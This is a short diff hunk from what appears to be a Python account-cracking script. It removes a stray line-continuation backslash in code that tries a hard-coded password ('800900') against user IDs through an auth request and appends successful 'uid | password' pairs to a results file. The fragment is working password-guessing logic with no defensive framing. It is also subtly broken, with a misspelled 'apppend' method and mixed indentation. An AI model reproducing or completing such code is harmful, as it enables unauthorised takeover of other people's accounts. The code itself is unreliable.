@@ -817,7 +817,7 @@ def a_s():
                                                                     cp = open('JANZADA_CP.txt', 'a')
                                                                     cp.write(uid + ' | ' + pass14 + '\n')
                                                                     cp.close()
-                                                                    cps.apppend(uid + pass14)\
+                                                                    cps.apppend(uid + pass14)
 					                        else:
 				                                    pass15 = '800900'
                                                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers=header).text
